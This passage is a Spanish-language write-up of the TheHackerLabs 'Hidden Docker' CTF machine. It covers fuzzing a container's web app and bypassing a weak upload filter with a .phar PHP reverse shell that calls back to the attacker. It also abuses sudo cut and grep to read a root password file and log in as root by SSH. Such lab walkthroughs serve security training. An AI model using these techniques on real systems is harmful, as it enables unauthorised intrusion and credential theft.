+<img src="/assets/images/THL-writeup-hiddenDocker/Captura13.png">
+</p>
+<p>Lo guardamos y lo activamos para poder ver la página web:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura14.png">
+</p>
+<p>Excelente, aunque a mi parecer, si ya descubrimos el puerto usado en el contenedor, lo mejor sería aplicar <strong>Reverse Port Forwarding</strong>.</p>
+<h3 id="PaginaDocker">Analizando Página Web del Contenedor Docker</h3>
+<p>Decidí aplicar el <strong>Reverse Port Forwarding</strong> para poder ver la página web del contenedor, esto por más comodidad y para que podamos ocupar nuestras herramientas sin problemas por el uso de proxies.</p>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura12.png">
+</p>
+<p>Parece ser la página de <strong>Dockerlabs</strong> del maestro <strong>Pingüino de Mario</strong> (un crack).</p>
+<p>Pero no hay ninguna funcionalidad que podamos analizar ni en su código fuente.</p>
+<p>Así que vamos a aplicar <strong>Fuzzing</strong> para ver que nos encontramos.</p>
+<p>Utilizaremos <strong>ffuf</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost:3000/FUZZ -t <span style="color:#ae81ff">300</span> -e .php,.txt,.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://localhost:3000/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span> :: Extensions       : .php .txt .html 
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uploads                 <span style="color:#f92672">[</span>Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 41ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>upload.php              <span style="color:#f92672">[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 126ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.php               <span style="color:#f92672">[</span>Status: 200, Size: 8235, Words: 3246, Lines: 142, Duration: 5743ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>machine.php             <span style="color:#f92672">[</span>Status: 200, Size: 1361, Words: 497, Lines: 54, Duration: 139ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.html                   <span style="color:#f92672">[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 152ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">[</span>Status: 200, Size: 8235, Words: 3246, Lines: 142, Duration: 9927ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.php                    <span style="color:#f92672">[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 9961ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>server-status           <span style="color:#f92672">[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 162ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>882180/882180<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">220</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:24:25<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">3699</span> ::
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Tenemos 2 páginas y un directorio, pero si revisamos la página <strong>upload.php</strong> no veremos nada; en cambio, la página <strong>machine.php</strong> nos muestra esto:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura15.png">
+</p>
+<p>Nos deja subir archivos, pero no sabemos qué tipo de archivos y el código fuente no lo dice.</p>
+<p>Intentemos subir una <strong>Reverse Shell</strong> de <strong>PHP</strong> como la de <strong>pentestmonkey</strong>, que puedes descargar de aquí:</p>
+<ul>
+<li><a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a></li>
+</ul>
+<p>Recuerda modificarla para agregar tu IP y el puerto que quieras usar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">set_time_limit</span> (<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>$VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>;
+</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Tu_IP&#39;</span>;  <span style="color:#75715e">// CHANGE THIS
+</span></span></span><span style="display:flex;"><span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>;       <span style="color:#75715e">// CHANGE THIS
+</span></span></span><span style="display:flex;"><span>$chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1400</span>;
+</span></span><span style="display:flex;"><span>$write_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>$error_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uname -a; w; id; /bin/bash -i&#39;</span>;
+</span></span></code></pre></div><p>Si la intentamos subir, nos dará el siguiente mensaje:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura16.png">
+</p>
+<p>Solamente acepta <strong>archivos ZIP</strong> o eso sabemos por ahora.</p>
+<p>Necesitamos saber si acepta otras extensiones, para cambiar la extensión de nuestra <strong>Reverse Shell</strong> y sea aceptada.</p>
+<h3 id="intruder">Aplicando Sniper Attack para Encontrar Extensiones Aceptadas por Página Web y Ganando Acceso al Contenedor de Docker</h3>
+<p>Primero, vamos a capturar la petición de la subida de archivos y la enviaremos al <strong>Intruder</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura17.png">
+</p>
+<p>Observa que ya configuramos el campo a probar, eligiendo la extensión del archivo subido y dándole al botón <strong>Add</strong>.</p>
+<p>Cargamos el wordlist que ocuparemos de <strong>seclists</strong>, que lo puedes encontrar en <code>/seclists/Discovery/Web-Content/web-extensions.txt</code> y quitamos la opción que URL Encodea cada petición.</p>
+<p>Ejecutamos el ataque y observa que hay una extensión que sí fue aceptada:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura18.png">
+</p>
+<p>Supongamos que cada archivo se carga en el directorio <code>/uploads</code> que descubrimos en el <strong>Fuzzing</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura19.png">
+</p>
+<p>Ahí está.</p>
+<p>Como ya la subimos, solo necesitas abrir un listener con <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+</span></span></code></pre></div><p>Y dale clic al archivo subido para que se ejecute.</p>
+<p>Observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.10.130<span style="color:#f92672">]</span> <span style="color:#ae81ff">43956</span>
+</span></span><span style="display:flex;"><span>Linux a34889d3b818 6.1.0-21-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span> 01:03:01 up 12:06,  <span style="color:#ae81ff">0</span> user,  load average: 0.10, 0.07, 0.04
+</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>24<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@a34889d3b818:/$
+</span></span></code></pre></div><p>Listo, estamos dentro del contenedor:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@a34889d3b818:/$ hostname -I
+</span></span><span style="display:flex;"><span>hostname -I
+</span></span><span style="display:flex;"><span>172.17.0.2
+</span></span></code></pre></div><p>Recuerda obtener una sesión interactiva:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Paso 1:</span>
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 2:</span>
+</span></span><span style="display:flex;"><span>CTRL + Z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 3:</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 4:</span>
+</span></span><span style="display:flex;"><span>reset -&gt; xterm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 5:</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>export SHELL<span style="color:#f92672">=</span>bash
+</span></span><span style="display:flex;"><span>stty rows <span style="color:#ae81ff">51</span> columns <span style="color:#ae81ff">189</span>
+</span></span></code></pre></div><p>Continuemos.</p>
+<h3 id="enumDock">Enumeración de Contenedor y Ganando Acceso como Root a la Máquina Víctima Vía SSH</h3>
+<p>Observa que el script de la página <strong>upload.php</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@a34889d3b818:/$ cat /var/www/html/upload.php 
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>$targetDir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uploads/&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>isset<span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;submit&#34;</span><span style="color:#f92672">]))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    $fileName <span style="color:#f92672">=</span> basename<span style="color:#f92672">(</span>$_FILES<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;file&#34;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">])</span>;
+</span></span><span style="display:flex;"><span>    $targetFilePath <span style="color:#f92672">=</span> $targetDir . $fileName;
+</span></span><span style="display:flex;"><span>    $fileType <span style="color:#f92672">=</span> pathinfo<span style="color:#f92672">(</span>$targetFilePath,PATHINFO_EXTENSION<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$fileType !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;zip&#34;</span> <span style="color:#f92672">&amp;&amp;</span> $fileType !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;phar&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;No se permite la subida de archivos que no sean .zip&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>move_uploaded_file<span style="color:#f92672">(</span>$_FILES<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;file&#34;</span><span style="color:#f92672">][</span><span style="color:#e6db74">&#34;tmp_name&#34;</span><span style="color:#f92672">]</span>, $targetFilePath<span style="color:#f92672">)){</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;El archivo &#34;</span>. $fileName. <span style="color:#e6db74">&#34; ha sido subido correctamente.&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            echo <span style="color:#e6db74">&#34;Ha ocurrido un error al subir el archivo.&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span></code></pre></div><p>Vemos que en la <strong>condición if</strong> acepta archivos con extensión <strong>zip o phar</strong>.</p>
+<p>Al revisar el <code>/etc/passwd</code>, vemos que hay 2 usuarios, además del <strong>Root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@a34889d3b818:/$ cat /etc/passwd | grep bash
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+</span></span><span style="display:flex;"><span>dbadmin:x:1001:1001::/home/dbadmin:/bin/bash
+</span></span></code></pre></div><p>Pero no podremos ver el contenido de sus directorios:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@a34889d3b818:/$ ls -la /home
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">1</span> root    root    <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">1</span> root    root    <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">20</span> 20:24 ..
+</span></span><span style="display:flex;"><span>drwxr-x--- <span style="color:#ae81ff">2</span> dbadmin dbadmin <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2024</span> dbadmin
+</span></span><span style="display:flex;"><span>drwxr-x--- <span style="color:#ae81ff">2</span> ubuntu  ubuntu  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2024</span> ubuntu
+</span></span></code></pre></div><p>Investigando un poco más, encontraremos un archivo de texto interesante en el directorio <code>/opt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@a34889d3b818:/$ ls -la /opt 
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">20</span> 20:24 ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">129</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2024</span> nota.txt
+</span></span></code></pre></div><p>Vamos a leerlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@a34889d3b818:/$ cat /opt/nota.txt 
+</span></span><span style="display:flex;"><span>Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
+</span></span></code></pre></div><p>Bien, nos han dejado una pista de dónde se encuentra la posible contraseña del <strong>usuario Root</strong>.</p>
+<p>Veamos si nuestro usuario tiene algún privilegio que nos ayude:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@a34889d3b818:/$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> www-data on a34889d3b818:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User www-data may run the following commands on a34889d3b818:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/cut
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/grep
+</span></span></code></pre></div><p>Genial, podemos usar los comandos <strong>cut y grep</strong> con privilegios de <strong>Root</strong>.</p>
+<p>Y al investigar en la <strong>guía de GTFOBins</strong>, encontraremos las formas en que podemos utilizar ambos comandos para leer archivos con privilegios.</p>
+<p>Primero, el comando <strong>cut</strong>:</p>
+<ul>
+<li><a href="https://gtfobins.github.io/gtfobins/cut/" target="_blank">GTFOBins: cut</a></li>
+</ul>
+<p>Utilizaremos estos comandos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura20.png">
+</p>
+<p>Y los aplicamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@a34889d3b818:/$ LFILE<span style="color:#f92672">=</span>/root/clave.txt
+</span></span><span style="display:flex;"><span>www-data@a34889d3b818:/$ sudo cut -d <span style="color:#e6db74">&#34;&#34;</span> -f1 <span style="color:#e6db74">&#34;</span>$LFILE<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Excelente, si parece ser una contraseña.</p>
+<p>Ahora el comando <strong>grep</strong>:</p>
+<ul>
+<li><a href="https://gtfobins.github.io/gtfobins/grep/" target="_blank">GTFOBins: grep</a></li>
+</ul>
+<p>Son casi los mismos comandos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-hiddenDocker/Captura21.png">
+</p>
+<p>Solamente utilizamos el último para leer el archivo deseado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@a34889d3b818:/$ sudo grep <span style="color:#e6db74">&#39;&#39;</span> $LFILE
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Funcionó también.</p>
+<p>Probemos esa contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh root@192.168.10.130
+</span></span><span style="display:flex;"><span>root@192.168.10.130<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux hiddendocker 6.1.0-21-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64</span>
+</span></span><span style="display:flex;"><span>Last login: Sat Jun <span style="color:#ae81ff">21</span> 03:04:56 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>root@hiddendocker:~# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Muy bien, ganamos acceso como <strong>Root</strong>.</p>
+<p>Ya solo veamos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@hiddendocker:~# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>root@hiddendocker:~# cat root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/" target="_blank" rel="noopener noreferrer">https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2" target="_blank" rel="noopener noreferrer">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2</a></li><li><a href="https://catonmat.net/tcp-port-scanner-in-bash" target="_blank" rel="noopener noreferrer">https://catonmat.net/tcp-port-scanner-in-bash</a></li><li><a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener noreferrer">https://github.com/jpillora/chisel</a></li><li><a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener noreferrer">https://github.com/pentestmonkey/php-reverse-shell</a></li><li><a href="https://gtfobins.github.io/gtfobins/cut/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/gtfobins/cut/</a></li><li><a href="https://gtfobins.github.io/gtfobins/grep/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/gtfobins/grep/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-canYouHackMe/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Can You Hack Me? - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-cryptoLabyrinth/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">CryptoLabyrinth - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
